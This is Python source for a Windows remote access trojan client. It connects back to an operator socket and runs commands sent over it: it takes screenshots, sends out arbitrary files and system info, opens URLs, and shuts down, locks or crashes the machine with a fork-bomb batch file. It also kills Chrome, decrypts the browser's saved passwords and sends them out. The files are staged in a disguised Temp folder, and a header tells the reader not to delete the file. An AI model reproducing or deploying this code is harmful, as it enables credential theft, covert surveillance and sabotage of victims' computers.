# THIS LINE SHOULD BE EMPTY. *** DO NOT DELETE THIS FILE ***

import os
import sys
import subprocess
import socket
import platform
import autopy
import time
import pickle
import base64
import struct
import webbrowser
from psutil import virtual_memory
import tkinter as tk
import sqlite3
import win32crypt
from win32com.client import GetObject

GREEN = '\33[32m'
RED = '\33[31m'
YELLOW = '\33[33m'
CYAN = '\033[1;36m'
BOLD = '\33[1m'
END = '\33[0m'
CURL = '\33[4m'

def socketCreate():
    global host
    global port
    global s
    host = ''
    port = ''
    s = socket.socket()

def socketConnect():
    global host
    global port
    global s
    s.connect((host, port))

def recieveCommands():
    global s
    while True:
        data = s.recv(8192)
        if data[:].decode("utf-8") == 'sysinfo':
            try:
                systemInfo = ('\n' + CYAN + 'Machine: ' + END + GREEN + BOLD + platform.machine() + END + '\n' + CYAN + 'Version: ' + END + GREEN + BOLD + platform.version() + END + '\n'
                + CYAN + 'Platform: ' + END + GREEN + BOLD + platform.platform() + END + '\n' + CYAN + 'System: '
                + END + GREEN + BOLD + platform.system() + END + '\n' + CYAN + 'Processor: ' + END + GREEN + BOLD + platform.processor() + END + '\n')
                str(systemInfo)
                s.send(str.encode(systemInfo))
            except:
                error = (RED + '[!] There was an unknown error!')
                s.send(str.encode(error))
        elif data[:].decode("utf-8") == 'screenshot':
            global pathToScreenshot
            path = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom'
            pathToScreenshot = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom\screenshot.png'
            if not os.path.exists(path):
                os.makedirs(path)
            try:
                bitmap = autopy.bitmap.capture_screen()
                bitmap.save(pathToScreenshot)
                tookScreenShot = ('\n' + GREEN + BOLD + '[*] Succesfuly took screenshot at ' + pathToScreenshot + END)
                use = ('\n' + GREEN + BOLD + "[*] Use 'download -s' to download screenshot" + END + '\n\n')
                s.send(str.encode(tookScreenShot + use))
            except:
                screenshotFailed = ('\n' + RED + "[!] Couldn't take screenshot " + END + '\n')
                str(screenshotFailed)
                s.send(str.encode(screenshotFailed))
        elif data[:].decode("utf-8") == 'download -s':
            try:
                with open(pathToScreenshot, "rb") as image_file:
                    encoded_image = base64.b64encode(image_file.read())
                    data = pickle.dumps(encoded_image, 0)
                    size = len(data)
                    # s.send(data)
                    s.send(struct.pack(">L", size) + data)
            except:
                pass
        elif data[:11].decode("utf-8") == 'download -f':
            try:
                filedir = data[12:].decode('utf-8')
                if not os.path.exists(filedir):
                    pass
                file = open(filedir, 'rb')
                file_data = file.read(1024)
                s.send(file_data)
            except:
                pass
        elif data[:7].decode("utf-8") == 'openurl':
            try:
                url = data[8:].decode("utf-8")
                webbrowser.open_new(url)
                success = '\n' + GREEN + BOLD + '[*] Opened ' + url + ' successfully' + END + '\n'
                s.send(str.encode(success))
            except:
                failed = '\n' + RED + BOLD + "[!] Coudn't open " + url + END + '\n'
                s.send(str.encode(failed))
        elif data[:].decode("utf-8") == 'shutdown':
            try:
                subprocess.call(['shutdown', "/s"])
                success = '\n' + GREEN + BOLD + '[*] Shutdown successfully' + END + '\n'
                s.send(str.encode(success))
            except:
                failed = '\n' + RED + BOLD + "[!] Couldn't shudown computer" + END + '\n'
                s.send(str.encode(failed))
        elif data[:].decode("utf-8") == 'restart':
            try:
                subprocess.call(['shutdown', '/r'])
                success = '\n' + GREEN + BOLD + '[*] Restarted successfully' + END + '\n'
                s.send(str.encode(success))
            except:
                failed = '\n' + RED + BOLD + "[!] Couldn't restart computer" + END + '\n'
                s.send(str.encode(failed))
        elif data[:].decode("utf-8") == 'memory':
            try:
                mem = str(virtual_memory())
                virtualram = '\n' + GREEN + BOLD + 'Available memory in bytes: ' + END + CYAN + mem + END
                s.send(str.encode(virtualram))
            except:
                error = RED + BOLD + "[!] Couldn't get virtual ram" + END + '\n'
                s.send(str.encode(error))
        if data[:].decode("utf-8") == 'chrome':
            try:
                WMI = GetObject('winmgmts:')
                processes = WMI.InstancesOf('Win32_Process')
                chromePath = r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
                def close_chrome():
                    try:
                        if "chrome.exe" in [process.Properties_('Name').Value for process in processes]:
                            os.system("TASKKILL /F /IM chrome.exe")
                        else:
                            pass
                    except:
                        pass

                def get_chrome():
                    data_path = os.path.expanduser('~') + chromePath
                    c = sqlite3.connect(data_path)
                    cursor = c.cursor()
                    select_statement = 'SELECT origin_url, username_value, password_value FROM Logins'
                    cursor.execute(select_statement)

                    login_data = cursor.fetchall()
                    cred = {}

                    string = ''

                    for url, user_name, pwd in login_data:
                        pwd = win32crypt.CryptUnprotectData(pwd)
                        cred[url] = (user_name, pwd[1].decode('utf8'))
                        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
                        dirPath = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom'
                        path = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom\chromePasses82374.txt'
                        if not os.path.exists(dirPath):
                            os.makedirs(dirPath)
                        f = open(path, 'w')
                        f.write(string)
                        f.close()

                close_chrome()
                get_chrome()

            except:
                pass
        elif data[:].decode("utf-8") == 'download -c':
            try:
                dirPath = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom'
                if not os.path.isdir(dirPath):
                    os.makedirs(dirPath)
                    print('Changed')
                file = open(os.path.join(dirPath + r"\chromePasses82374.txt"), "rb")
                file_data = file.read(1024)
                s.send(file_data)
            except:
                pass
        elif data[:4].decode("utf-8") == 'lock':
            try:
                successSend = ('\n' + GREEN + BOLD + '[*] Successfully locked computer screen' + END + '\n')
                s.send(str.encode(successSend))
                message = data[5:].decode('utf-8')
                class App():
                    def __init__(self):
                        self.root = tk.Tk()
                        self.root.attributes('-fullscreen', True)
                        self.main_frame = tk.Frame(self.root)
                        self.main_frame.config(background='red', cursor='none')
                        self.main_frame.pack(fill=tk.BOTH, expand=tk.TRUE)
                        self.root.bind('<F1>', self.opennote)
                        self.root.bind('<F2>', self.closenote)
                        self.root.bind('<F3>', self.quit)
                        l = tk.Label(self.main_frame, text=message)
                        l.pack()
                        self.root.mainloop()
                    def opennote(self, event):
                        self.n = tk.Text(self.main_frame, background='blue')
                        self.n.pack()
                    def closenote(self, event):
                        self.n.destroy()
                    def quit(self, event):
                        self.root.destroy()
                App()
            except:
                error = '\n' + RED + BOLD + '[!] There was an error locking the screen' + END + '\n'
                s.send(str.encode(error))

        elif data[:].decode('utf-8') == 'crash':
            try:
                defultPath = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom'
                if not os.path.exists(defultPath):
                    os.makedirs(defultPath)
                pathToCrash = r'C:\Windows\Temp\LocalCustom\ssh\\new\custom\okigjsdlkjg.bat'
                removePath = r'C:\Windows\Temp\LocalCustom'
                f = open(pathToCrash, 'w')
                f.write("start %0\n%0")
                f.close()
                bashcommand = 'start ' + pathToCrash
                os.system(bashcommand)
                os.rmdir(removePath)
                success = '\n' + GREEN + BOLD + '[*] Successfully crashing computer' + END + '\n'
                s.send(str.encode(success))
            except:
                error = '\n' + RED + BOLD + '[!] There was an error in attempting to crash the computer' + END + '\n'
                s.send(str.encode(error))
    if s.close():
        time.sleep(20)
        main()

def main():
    socketCreate()
    socketConnect()
    recieveCommands()

main()
